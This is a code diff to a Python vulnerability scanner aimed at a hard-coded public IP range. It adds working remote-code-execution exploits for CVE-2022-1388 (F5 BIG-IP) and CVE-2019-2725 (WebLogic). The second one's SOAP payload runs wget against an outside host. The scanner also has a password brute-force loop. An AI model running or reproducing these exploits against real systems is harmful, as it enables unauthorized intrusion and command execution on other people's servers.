@@ -3,6 +3,10 @@ import requests
 import socket
 import time
 import ipaddress
+import urllib3
+import sys
+
+urllib3.disable_warnings()
 
 ip_range = '45.42.173.128/26'
 ports = [80, 443]
@@ -48,6 +52,8 @@ class VulnerabilityScanner:
             self.scan_weak_passwords()
             self.scan_network_vulnerabilities()
             self.scan_web_application_security()
+            self.cve_2022_1388_exploit()
+            self.cve_2019_2725_exploit()
 
     def scan_xss(self):
             self.check_xss_stored()
@@ -114,7 +120,9 @@ class VulnerabilityScanner:
         for username in usernames:
             for password in passwords:
                 response = requests.post(self.target_url + "/login", data={"username": username, "password": password})
-                if "Login successful" in response.text:
+                #response = requests.post(self.target_url + "/", data={"username": username, "password": password})
+                #print(response.text)
+                if "Login Successful" in response.text:
                     self.vulnerabilities.append("Weak password vulnerability found")
 
     def scan_network_vulnerabilities(self):
@@ -153,6 +161,42 @@ class VulnerabilityScanner:
         response = requests.get(self.target_url + "?file=" + payload)
         if "Sensitive information leaked" in response.text:
             self.vulnerabilities.append("Remote File Inclusion (RFI) vulnerability found")
+
+    def cve_2022_1388_exploit(self):
+        url = f'{self.target_url}mgmt/tm/util/bash'
+        command = "echo 'CVE-2022-1388 Exploit Test' > /tmp/cve_2022_1388_test.txt"
+        headers = {
+            'Host': '127.0.0.1',
+            'Authorization': 'Basic YWRtaW46aG9yaXpvbjM=',
+            'X-F5-Auth-Token': 'asdf',
+            'Connection': 'X-F5-Auth-Token',
+            'Content-Type': 'application/json'
+
+        }
+        j = {"command": "run", "utilCmdArgs": "-c '{0}'".format( command )}
+        r = requests.post( url, headers=headers, json=j, verify=False )
+        #r.raise_for_status()
+        response_headers = r.headers.get("content-type")
+        if r.status_code != 204 and response_headers == ( "application/json" ):
+            print( r.json()['commandResult'].strip() )
+            self.vulnerabilities.append("CVE-2022-1388 vulnerability found")
+
+    def cve_2019_2725_exploit(self):
+        request_headers = {"Accept-Encoding": "gzip, deflate", "Accept": "*/*", "Accept-Language": "en", "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)", "Connection": "close", "Content-Type": "text/xml"}
+        path='/_async/AsyncResponseService'
+        payload='<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   <soapenv:Header> <wsa:Action>xx</wsa:Action><wsa:RelatesTo>xx</wsa:RelatesTo><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java><class><string>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</string><void><string>wget http://www.cvc.com.br/robot.txt</string></void></class></java>    </work:WorkContext>   </soapenv:Header>   <soapenv:Body>      <asy:onAsyncDelivery/>   </soapenv:Body></soapenv:Envelope>'
+        url = self.target_url
+
+        try:
+            response = requests.post(url+path, headers=request_headers, data=payload)
+            if(response.status_code==202):
+                print('[+]'+url+' server with vul.')
+                self.vulnerabilities.append("CVE-2019-2725 vulnerability found")
+        except requests.exceptions.RequestException as e:
+            print('[-]'+url+' Time out')
+            #continue
+
+        print('\n\nPOC executed with Successful.')
 
     def report_vulnerabilities(self):
         if self.vulnerabilities:
